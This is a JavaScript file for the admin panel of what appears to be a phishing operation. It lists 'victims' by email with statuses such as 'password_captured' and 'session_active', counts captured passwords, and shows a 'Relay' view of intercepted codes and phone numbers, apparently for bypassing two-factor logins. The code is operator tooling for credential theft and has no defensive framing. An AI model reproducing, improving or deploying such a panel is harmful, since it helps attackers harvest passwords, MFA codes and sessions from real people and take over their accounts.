const api=location.origin;
let adminPw=sessionStorage.getItem('cademoAdminPw')||'';
let allData=[];
if(adminPw) doLogin();
function doLogin(){
  if(!adminPw) adminPw=document.getElementById('admin-pw').value;
  if(!adminPw) return document.getElementById('login-err').textContent='Entrez le mot de passe';
  fetch(api+'/api/victims?password='+encodeURIComponent(adminPw)).then(r=>r.json()).then(d=>{
    if(!d.success) return document.getElementById('login-err').textContent=d.error||'Erreur';
    sessionStorage.setItem('cademoAdminPw',adminPw);
    document.getElementById('login-screen').classList.add('hidden');
    document.getElementById('admin-screen').classList.remove('hidden');
    loadAll();
  }).catch(e=>document.getElementById('login-err').textContent='Erreur reseau');
}
function logout(){sessionStorage.removeItem('cademoAdminPw');location.reload();}
async function loadAll(){
  const [victims,stats]=await Promise.all([fetch(api+'/api/victims?password='+encodeURIComponent(adminPw)).then(r=>r.json()),fetch(api+'/api/stats').then(r=>r.json())]);
  if(victims.success){allData=victims.victims||[];renderTable();}
  if(stats.success){
    document.getElementById('stat-total').textContent=stats.total||0;
    document.getElementById('stat-verified').textContent=stats.verified||0;
    document.getElementById('stat-pwd').textContent=allData.filter(v=>v.status==='password_captured'||v.status==='session_active').length;
    document.getElementById('stat-error').textContent=allData.filter(v=>v.status&&/error/.test(v.status)).length;
  }
}
function renderTable(){
  const term=document.getElementById('search').value.toLowerCase();
  const filtered=allData.filter(v=>(v.email||'').toLowerCase().includes(term));
  const tbl=document.getElementById('tbl');
  if(!filtered.length){tbl.innerHTML='<tr><th>Email</th><th>Status</th><th>Date</th><th>Actions</th></tr>';return;}
  let html='<tr><th>Email</th><th>Status</th><th>Date</th><th>Actions</th></tr>';
  filtered.forEach(v=>{
    const s=v.status||'inconnu';
    let cls='tag-blue';
    if(s==='session_active') cls='tag-green';
    else if(s==='password_captured') cls='tag-amber';
    else if(/error/.test(s)) cls='tag-red';
    const date=v.created_at?new Date(v.created_at).toLocaleString('fr-FR',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}):'-';
    html+='<tr><td style="font-family:monospace;font-size:12px">'+(v.email||'-')+'</td><td><span class="tag '+cls+'">'+s+'</span></td><td style="color:var(--muted);font-size:12px">'+date+'</td>';
    html+='<td><button class="btn btn-sm" onclick="showRelay('+JSON.stringify(v.email||'')+')">Relay</button></td></tr>';
  });
  tbl.innerHTML=html;
}
function filterTable(){renderTable();}
async function showRelay(email){
  if(!email) return;
  document.getElementById('detail-panel').classList.remove('hidden');
  document.getElementById('detail-email').textContent=email;
  document.getElementById('detail-content').textContent='Chargement...';
  try{
    const r=await fetch(api+'/api/relay/'+encodeURIComponent(email));
    const d=await r.json();
    if(d.success&&d.data){
      const data=d.data;
      let txt='Status: '+(data.status||'-')+'\n';
      if(data.code) txt+='Code: '+data.code+'\n';
      if(data.phone) txt+='Telephone: '+data.phone+'\n';
      if(data.error) txt+='Erreur: '+data.error+'\n';
      if(!data.status&&!data.code&&!data.phone&&!data.error) txt='Aucune donnee relay';
      document.getElementById('detail-content').textContent=txt;
    }else{document.getElementById('detail-content').textContent='Aucune donnee relay';}
  }catch(e){document.getElementById('detail-content').textContent='Erreur: '+e.message;}
}
setInterval(()=>{if(!document.getElementById('admin-screen').classList.contains('hidden')) loadAll();},10000);
